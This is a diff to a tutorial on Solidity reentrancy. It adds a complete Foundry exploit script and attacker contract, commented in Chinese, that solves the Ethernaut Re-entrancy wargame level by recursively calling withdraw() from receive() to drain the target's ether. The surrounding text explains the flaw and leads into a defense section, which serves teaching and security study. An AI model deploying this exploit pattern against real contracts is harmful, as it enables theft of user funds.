@@ -75,6 +75,118 @@ contract Reentrance {
 4. **Re-entry:** Inside `receive()`, the Attacker calls `withdraw()` again.
 5. **Bypass:** Because `balances[msg.sender] -= _amount` has **not yet happened** in the first frame of execution, the balance check passes again.
 6. **Loop:** This cycle repeats until the Attacker stops calling recursively or the Victim is drained.
+7. **Ethernaut Re-entrancy level solution**
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Script.sol";
+import "forge-std/console.sol";
+
+// 接口定义 - 注意 Solidity 0.6.x 语法
+interface IReentrancy {
+    function balanceOf(address _who) external view returns (uint256);
+    function withdraw(uint256 _amount) external;
+    function donate(address _to) external payable;
+}
+
+// 攻击合约
+contract ReentrancyAttacker {
+    IReentrancy public target;
+    uint256 public attackCount;
+    
+    // 构造函数
+    constructor(address _targetAddress) payable {
+        target = IReentrancy(_targetAddress);
+    }
+    
+    // 攻击函数
+    function attack() external payable {
+        // 这里的 msg.value 是脚本调用 attack() 时传入的金额
+        require(msg.value >= 0.001 ether, "Need at least 0.001 ether");
+        
+        // 1. 先捐款给自己，建立初始余额
+        target.donate{value: msg.value}(address(this));
+        
+        // 2. 开始提款攻击，触发 receive
+        target.withdraw(msg.value);
+    }
+    
+    // 接收函数 - 用于重入攻击
+    receive() external payable {
+        console.log("Received:", msg.value, "wei in fallback");
+        
+        if (attackCount < 10) {
+            attackCount++;
+            
+            // 继续提款（重入攻击）
+            uint256 targetBalance = address(target).balance;
+            if (targetBalance >= msg.value) {
+                target.withdraw(msg.value);
+            }
+        }
+    }
+    
+    // 提取攻击所得
+    function withdraw() public {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+    
+    // 获取合约余额
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+
+// 攻击脚本
+contract ScriptReentrancy is Script {
+    function run() external {
+        // 目标合约地址
+        address targetAddress = 0x2Bf72Ae9CcA90Fcb9C9F8C70C422dAd8f6Ea0053; // 替换为实际地址
+        
+        uint256 privateKey = vm.envUint("PRIVATE_KEY");
+        address attacker = vm.addr(privateKey);
+        
+        console.log("=== Reentrancy Attack ===");
+        console.log("Target:", targetAddress);
+        console.log("Attacker:", attacker);
+        
+        // 获取目标合约余额
+        uint256 targetBalance = targetAddress.balance;
+        console.log("Target balance:", targetBalance, "wei");
+        
+        // 攻击金额
+        uint256 attackAmount = 0.001 ether;
+        console.log("Attack amount:", attackAmount, "wei");
+        
+        vm.startBroadcast(privateKey);
+        
+        // 部署攻击合约
+        console.log("Deploying attacker...");
+        ReentrancyAttacker attackerContract = new ReentrancyAttacker(
+            targetAddress
+        );
+        
+        console.log("Attacker deployed at:", address(attackerContract));
+        
+        // 执行攻击(带入value)
+        console.log("Executing attack...");
+        attackerContract.attack{value: attackAmount}();
+        
+        vm.stopBroadcast();
+        
+        // 验证结果
+        uint256 attackerBalance = address(attackerContract).balance;
+        console.log("Attacker contract balance:", attackerBalance, "wei");
+        
+        if (attackerBalance > attackAmount) {
+            console.log("Attack successful! Profit:", attackerBalance - attackAmount, "wei");
+        } else {
+            console.log("Attack failed or no profit");
+        }
+    }
+}
+```
 
 ## 3. Comprehensive Defense & Remediation
 
